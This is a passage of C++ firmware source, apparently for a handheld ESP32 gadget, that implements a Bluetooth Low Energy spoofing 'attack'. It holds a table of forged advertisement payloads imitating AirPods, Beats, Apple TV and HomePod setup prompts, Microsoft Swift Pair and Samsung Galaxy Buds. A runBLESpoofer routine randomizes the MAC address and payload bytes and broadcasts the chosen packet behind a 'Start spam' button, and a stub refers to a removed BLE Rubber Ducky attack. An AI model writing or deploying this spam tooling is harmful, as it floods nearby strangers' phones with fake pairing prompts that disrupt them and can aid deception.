    {"Beats Studio Buds", {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x11, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}},
    {"Beats Studio Buds+", {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x16, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}},
    
    // Apple TV/HomePod/iPhone Setup Prompts
    {"Apple TV Setup", {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x01, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}},
    {"Apple TV Pair", {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x06, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}},
    {"Apple TV New User", {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x20, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}},
    {"Apple TV AppleID", {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x2b, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}},
    {"Apple TV Audio", {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0xc0, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}},
    {"Apple TV Homekit", {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x0d, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}},
    {"Apple TV Keyboard", {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x13, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}},
    {"Apple TV Network", {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x27, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}},
    {"HomePod Setup", {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x0b, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}},
    {"Setup New Phone", {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x09, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}},
    {"Transfer Number", {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x02, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}},
    {"TV Color Balance", {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x1e, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}},
    
    // Microsoft Swift Pair - BUG FIX 1.27: Corrected payload length and format
    {"Swift Pair", {0x18, 0xff, 0x06, 0x00, 0x03, 0x00, 0x80, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 0x10, 0x11, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}},
    {"Surface Buds", {0x18, 0xff, 0x06, 0x00, 0x03, 0x00, 0x80, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x99, 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff, 0x00, 0x11, 0x22, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}},
    {"Surface Headphones", {0x18, 0xff, 0x06, 0x00, 0x03, 0x00, 0x80, 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff, 0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x99, 0xaa, 0xbb, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}},
    
    // Samsung Fast Pair - BUG FIX 1.27: Corrected payload format with proper model IDs
    {"Galaxy Buds", {0x0f, 0xff, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}},
    {"Galaxy Buds+", {0x0f, 0xff, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x02, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}},
    {"Galaxy Buds Pro", {0x0f, 0xff, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x03, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}},
    {"Galaxy Buds 2", {0x0f, 0xff, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x04, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}}
};
static const int spooferDeviceCount_Total = sizeof(spooferDevices) / sizeof(spooferDevices[0]);

// Button definitions (from system_runtime.cpp)
#define BTN_UP     32
#define BTN_DOWN   33
#define BTN_LEFT   26
#define BTN_RIGHT  27
#define BTN_SELECT 25

// Simple button press detection
static unsigned long spooferLastButtonPress = 0;
static const unsigned long spooferButtonDebounce = 200;

bool spooferButtonPressed(int pin) {
    if (millis() - spooferLastButtonPress < spooferButtonDebounce) return false;
    extern int companion_readButtonState(int pin);
    if (companion_readButtonState(pin) == LOW) {
        spooferLastButtonPress = millis();
        return true;
    }
    return false;
}

void drawSpooferMenu() {
    tft.fillRect(0, 80, 240, 160, ILI9341_BLACK);
    
    tft.setTextSize(1);
    tft.setTextColor(tft.color565(160,160,160));
    tft.setCursor(18, 85);
    tft.print("Select Device:");
    
    // Show 5 devices at a time
    int startIdx = max(0, spooferSelectedDevice - 2);
    int endIdx = min(spooferDeviceCount_Total, startIdx + 5);
    
    for (int i = startIdx; i < endIdx; i++) {
        int yPos = 100 + (i - startIdx) * 15;
        
        if (i == spooferSelectedDevice) {
            tft.fillRect(15, yPos - 2, 210, 12, tft.color565(50, 50, 100));
            tft.setTextColor(ILI9341_WHITE);
        } else {
            tft.setTextColor(tft.color565(160,160,160));
        }
        
        tft.setCursor(20, yPos);
        tft.print(spooferDevices[i].name);
    }
    
    tft.setTextSize(1);
    tft.setTextColor(tft.color565(255, 200, 0));
    tft.setCursor(18, 190);
    tft.print("UP/DOWN: Select");
    tft.setCursor(18, 205);
    tft.print("SELECT: Start spam");
}

void runBLESpoofer() {
    if (attackFirstDraw) {
        // Initialize BLE
        if (!initBLEForAttacks()) {
            tft.fillRect(0, 20, 240, 300, ILI9341_BLACK);
            tft.setTextSize(1);
            tft.setTextColor(ILI9341_RED);
            tft.setCursor(18, 40);
            tft.print("BLE Init Failed!");
            return;
        }
        
        tft.fillRect(0, 20, 240, 300, ILI9341_BLACK);
        tft.setTextSize(2);
        tft.setTextColor(tft.color565(255, 200, 0));
        tft.setCursor(18, 40);
        tft.print("BLE Spoofer");
        
        tft.setTextSize(1);
        tft.setTextColor(tft.color565(160,160,160));
        tft.setCursor(18, 58);
        tft.print("Choose device to send");
        
        attackFirstDraw = false;
        attackPacketsSent = 0;
        attackLastSend = 0;
        spooferDeviceCount = 0;
        spooferSelectedDevice = 0;
        spooferMenuMode = true;
        spooferLastButtonPress = 0;
        
        drawSpooferMenu();
    }
    
    // Always in menu mode - select and send manually
    if (spooferButtonPressed(BTN_UP)) {
        spooferSelectedDevice--;
        if (spooferSelectedDevice < 0) spooferSelectedDevice = spooferDeviceCount_Total - 1;
        drawSpooferMenu();
    }
    
    if (spooferButtonPressed(BTN_DOWN)) {
        spooferSelectedDevice++;
        if (spooferSelectedDevice >= spooferDeviceCount_Total) spooferSelectedDevice = 0;
        drawSpooferMenu();
    }
    
    if (spooferButtonPressed(BTN_SELECT)) {
        // Send the selected device ONCE - user can press SELECT again to send again
        
        // Randomize MAC address for each send
        uint8_t newMac[6];
        newMac[0] = 0xF0 | (random(0, 16) & 0x0F);
        for (int i = 1; i < 6; i++) {
            newMac[i] = random(0, 256);
        }
        NimBLEDevice::setOwnAddr(newMac);
        
        // Get selected device payload
        uint8_t payload[31];
        memcpy(payload, spooferDevices[spooferSelectedDevice].payload, 31);
        
        // Determine payload length from first byte
        uint8_t payloadLen = payload[0] + 1; // First byte is length field
        
        // BUG FIX 1.27: Improved payload randomization for different device types
        // Only randomize trailing bytes for Apple devices (length 0x1e = 30+1 = 31 bytes)
        // For Apple TV/HomePod (length 0x16 = 22+1 = 23 bytes), randomize bytes 17-22
        // For Swift Pair/Surface (length 0x18 = 24+1 = 25 bytes), randomize bytes 7-24
        // For Samsung (length 0x0f = 15+1 = 16 bytes), randomize bytes 9-15
        if (payloadLen == 31) {
            // Apple proximity pairing (AirPods, Beats, AirTag) - randomize bytes 19-30
            for (int i = 19; i < 31; i++) {
                payload[i] = random(0, 256);
            }
        } else if (payloadLen == 23) {
            // Apple TV/HomePod setup prompts - randomize bytes 17-22
            for (int i = 17; i < 23; i++) {
                payload[i] = random(0, 256);
            }
        } else if (payloadLen == 25) {
            // Microsoft Swift Pair/Surface - randomize bytes 7-24
            for (int i = 7; i < 25; i++) {
                payload[i] = random(0, 256);
            }
        } else if (payloadLen == 16) {
            // Samsung Galaxy Buds - randomize bytes 9-15
            for (int i = 9; i < 16; i++) {
                payload[i] = random(0, 256);
            }
        }
        
        // Send BLE advertisement
        NimBLEAdvertisementData advData;
        advData.addData(payload, payloadLen);
        
        NimBLEAdvertising* pAdvertising = NimBLEDevice::getAdvertising();
        pAdvertising->setAdvertisementData(advData);
        pAdvertising->start();
        delay(200); // Keep advertising for 200ms to ensure device sees it
        pAdvertising->stop();
        
        attackPacketsSent++;
        
        // Show feedback
        tft.fillRect(18, 220, 200, 20, ILI9341_BLACK);
        tft.setTextSize(1);
        tft.setTextColor(ILI9341_GREEN);
        tft.setCursor(18, 220);
        tft.print("Sent! Total: ");
        tft.print(attackPacketsSent);
    }
}


// ===== BLE RUBBER DUCKY ATTACK =====
// Removed to save RAM

void runBLERubberDucky() {
    if (attackFirstDraw) {
        tft.fillRect(0, 20, 240, 300, ILI9341_BLACK);
        tft.setTextSize(2);
        tft.setTextColor(ILI9341_RED);
        tft.setCursor(18, 40);
        tft.print("Not Available");
        
        tft.setTextSize(1);
        tft.setTextColor(tft.color565(160,160,160));
        tft.setCursor(18, 80);
        tft.print("Feature removed");
        tft.setCursor(18, 95);
        tft.print("to save RAM");
        
        attackFirstDraw = false;
    }
}


